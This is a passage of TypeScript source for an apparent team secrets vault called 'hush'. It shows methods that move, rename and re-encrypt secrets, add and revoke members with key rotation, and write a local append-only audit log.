    const entry = this.data.envs[env]?.[key];
    if (!entry) throw new ValidationError(`No secret "${key}" in env "${env}".`);
    return openValue(this.dek(id), env, key, entry);
  }

  /**
   * Move a value from one set to another.
   *
   * Not a map-key edit: the environment name is bound into every value's AAD —
   * the thing that stops a staging URL being pasted into the prod slot — so the
   * value is opened and re-sealed under its new home. That also means this needs
   * an identity, and that it is not mergeable with a concurrent write.
   *
   * It exists because the state everybody actually starts in is one big pile of
   * keys under "default", and carving that into named sets is the whole point of
   * naming them.
   */
  moveSecret(id: Opener, key: string, from: string, to: string): void {
    assertScopeName(from);
    assertScopeName(to);
    assertKeyName(key);
    if (from === to) return;

    const entry = this.data.envs[from]?.[key];
    if (!entry) throw new ValidationError(`No secret "${key}" in "${from}".`);
    if (this.data.envs[to]?.[key]) {
      throw new ValidationError(`"${to}" already has a ${key}. Delete one of them first.`);
    }

    this.structural = true;
    this.opener = id;

    const value = openValue(this.dek(id), from, key, entry);
    const slot = this.ensureEnv(to);
    slot[key] = {
      ...sealValue(this.dek(id), to, key, value),
      gen: this.data.dek.generation,
      updatedAt: entry.updatedAt,
      updatedBy: entry.updatedBy,
      ...(entry.note ? { note: entry.note } : {}),
    };
    delete this.data.envs[from][key];
  }

  /**
   * Change a secret's label without unsealing it.
   *
   * The note is plaintext metadata beside the ciphertext — not inside it, and
   * not part of the AAD — so relabelling needs no data key. Doing this through
   * set() meant decrypting and re-sealing, which for a hardware-backed identity
   * asked the user to touch their key just to rename a tag.
   */
  retag(env: string, key: string, note?: string): boolean {
    const entry = this.data.envs[env]?.[key];
    if (!entry) return false;
    const label = trimNote(note);
    if (label) entry.note = label;
    else delete entry.note;
    this.journal.push({ op: "retag", env, key, ...(label ? { note: label } : {}) });
    return true;
  }

  delete(env: string, key: string): boolean {
    const slot = this.data.envs[env];
    if (!slot?.[key]) return false;
    delete slot[key];
    this.journal.push({ op: "delete", env, key });
    return true;
  }

  /** Decrypt an entire environment. Only ever called in-process, never written out by default. */
  materialize(id: Opener, env: string): Record<string, string> {
    const dek = this.dek(id);
    const out: Record<string, string> = {};
    for (const [key, entry] of Object.entries(this.data.envs[env] ?? {})) {
      out[key] = openValue(dek, env, key, entry);
    }
    return out;
  }

  // --------------------------------------------------------------- members

  addRecipient(id: Opener, name: string, pkString: string, role: "admin" | "member" = "member"): string {
    const dek = this.dek(id);
    this.structural = true;
    this.opener = id;
    const now = new Date().toISOString();

    // Names must be unique, because `hush team rm <name>` is how access is
    // revoked. Two members called "bob" meant removing one, being told it
    // worked, and leaving the other with full access — the exact failure
    // revocation exists to prevent.
    const incomingFp = isAgeRecipient(pkString)
      ? ageFingerprint(pkString.trim())
      : fingerprint(decodePub(pkString));
    const clash = Object.entries(this.data.recipients).find(
      ([fp, r]) => r.name === name && fp !== incomingFp,
    );
    if (clash) {
      throw new ValidationError(
        `"${name}" is already a member with a different key (${clash[1].pk.slice(0, 20)}…). ` +
          `Pick a distinct name, or remove the existing one first.`,
      );
    }

    // An age recipient may be a hardware key; hush never learns which.
    if (isAgeRecipient(pkString)) {
      const recipient = pkString.trim();
      const fp = ageFingerprint(recipient);
      this.data.recipients[fp] = { name, pk: recipient, role, addedAt: now, type: "age" };
      this.data.dek.wraps[fp] = { age: wrapDekWithAge(dek, recipient) };
      return fp;
    }

    const pub = decodePub(pkString);
    const fp = fingerprint(pub);
    this.data.recipients[fp] = { name, pk: encodePub(pub), role, addedAt: now, type: "x25519" };
    this.data.dek.wraps[fp] = wrapDek(dek, pub);
    return fp;
  }

  /**
   * Remove a member and mint a fresh DEK generation, re-sealing every value.
   * Past values they already read stay compromised — rotate those upstream.
   */
  removeRecipient(id: Opener, name: string): { removed: Recipient; reEncrypted: number } {
    this.structural = true;
    this.opener = id;
    // Remove *every* entry with this name. New vaults cannot contain duplicates,
    // but one written before that rule could, and revoking half of someone is
    // worse than refusing outright.
    const matches = Object.entries(this.data.recipients).filter(([, r]) => r.name === name);
    if (matches.length === 0) throw new ValidationError(`No member named "${name}".`);
    const [, removed] = matches[0];

    // The guard is about lock-out, not about identity. Retiring your *software*
    // key once a hardware one is in the vault is the final step of the upgrade
    // hush recommends — refusing it outright made the top rung unreachable.
    const doomed = new Set(matches.map(([f]) => f));
    const mine = this.myCandidates(id);
    if (mine.some((c) => doomed.has(c.fp))) {
      const survives = mine.some((c) => !doomed.has(c.fp) && this.data.dek.wraps[c.fp]);
      if (!survives) {
        throw new ValidationError(
          `Removing "${name}" would remove your own last key, locking you out of this vault.\n` +
            `  Add another identity first — e.g. a hardware key via \`hush secure --hardware\`.`,
        );
      }
    }

    // Decrypt everything first: if that fails we have changed nothing.
    const plaintext = this.snapshot(id);

    // Re-seal against a recipient list that excludes them, but only commit the
    // deletion once it worked — otherwise a failing age plugin could leave the
    // vault with a member dropped and the key not actually rotated.
    const keptRecipients = { ...this.data.recipients };
    for (const [f] of matches) delete keptRecipients[f];

    const previous = { recipients: this.data.recipients, dek: this.data.dek };
    this.data.recipients = keptRecipients;
    try {
      const reEncrypted = this.reseal(plaintext);
      return { removed, reEncrypted };
    } catch (e) {
      this.data.recipients = previous.recipients;
      this.data.dek = previous.dek;
      throw e;
    }
  }

  /**
   * Rename an environment, values and all.
   *
   * The name is bound into every value's AAD — that is what stops a staging URL
   * being pasted into the prod slot — so a rename is not a map-key edit. Every
   * value has to be opened and re-sealed under the new name, which is why this
   * needs an identity and why it is structural: it cannot be merged with a
   * concurrent write.
   */
  renameEnv(id: Opener, from: string, to: string): { moved: number } {
    assertScopeName(from);
    assertScopeName(to);
    if (from === to) return { moved: 0 };
    if (!this.data.envs[from]) throw new ValidationError(`No environment "${from}".`);
    if (this.data.envs[to]) {
      throw new ValidationError(
        `"${to}" already exists. Pick another name, or move the keys across one at a time.`,
      );
    }

    this.structural = true;
    this.opener = id;

    // Open everything first: if any of it fails we have changed nothing.
    const plaintext = this.materialize(id, from);
    const previous = this.data.envs[from];

    const moved: Record<string, SecretEntry> = {};
    const dek = this.dek(id);
    for (const [key, value] of Object.entries(plaintext)) {
      const prev = previous[key];
      moved[key] = {
        ...sealValue(dek, to, key, value),
        gen: this.data.dek.generation,
        updatedAt: prev.updatedAt,
        updatedBy: prev.updatedBy,
        ...(prev.note ? { note: prev.note } : {}),
      };
    }

    this.data.envs[to] = moved;
    delete this.data.envs[from];

    if (this.data.meta?.[from]) {
      this.data.meta[to] = this.data.meta[from];
      delete this.data.meta[from];
    }
    return { moved: Object.keys(moved).length };
  }

  /** New DEK generation for every remaining recipient. Used by rotate and by removal. */
  rotate(id: Opener): number {
    this.structural = true;
    this.opener = id;
    const plaintext = this.snapshot(id);
    return this.reseal(plaintext);
  }

  private snapshot(id: Opener): Record<string, Record<string, string>> {
    const out: Record<string, Record<string, string>> = {};
    for (const env of this.envNames()) out[env] = this.materialize(id, env);
    return out;
  }

  private reseal(plaintext: Record<string, Record<string, string>>): number {
    const dek = newDek();
    const wraps: Record<string, DekWrap> = {};
    for (const [fp, r] of Object.entries(this.data.recipients)) {
      wraps[fp] = r.type === "age" || isAgeRecipient(r.pk)
        ? { age: wrapDekWithAge(dek, r.pk) }
        : wrapDek(dek, decodePub(r.pk));
    }
    const generation = this.data.dek.generation + 1;
    this.data.dek = { generation, wraps };

    let count = 0;
    for (const [env, values] of Object.entries(plaintext)) {
      for (const [key, value] of Object.entries(values)) {
        const prev = this.data.envs[env][key];
        this.data.envs[env][key] = {
          ...sealValue(dek, env, key, value),
          gen: generation,
          updatedAt: prev.updatedAt,
          updatedBy: prev.updatedBy,
          ...(prev.note ? { note: prev.note } : {}),
        };
        count++;
      }
    }
    // Drop the cache: the next reader re-derives from their own wrap.
    this.dekCache = null;
    return count;
  }

  members(): (Recipient & { fingerprint: string; canDecrypt: boolean; kind: string })[] {
    return Object.entries(this.data.recipients)
      .map(([fp, r]) => ({
        ...r,
        name: safeText(r.name, 64) ?? "unknown",
        fingerprint: fp,
        canDecrypt: Boolean(this.data.dek.wraps[fp]),
        kind: r.type === "age" || isAgeRecipient(r.pk) ? "age" : "x25519",
      }))
      .sort((a, b) => a.name.localeCompare(b.name));
  }
}

// -------------------------------------------------------------------- audit

/** Local, append-only access log. Never committed — it records what *you* read. */
/** Rotate at this size so a long-lived machine cannot fill the disk. */
const AUDIT_MAX_BYTES = 2 * 1024 * 1024;

export function audit(hushDir: string, event: Record<string, unknown>): void {
  try {
    mkdirSync(hushDir, { recursive: true });
    const path = join(hushDir, "audit.log");
    if (existsSync(path) && statSync(path).size > AUDIT_MAX_BYTES) {
      renameSync(path, `${path}.1`); // keeps exactly one previous generation
    }
    appendFileSync(path, JSON.stringify({ at: new Date().toISOString(), ...event }) + "\n");
  } catch {
    /* auditing must never break the command */
  }
}
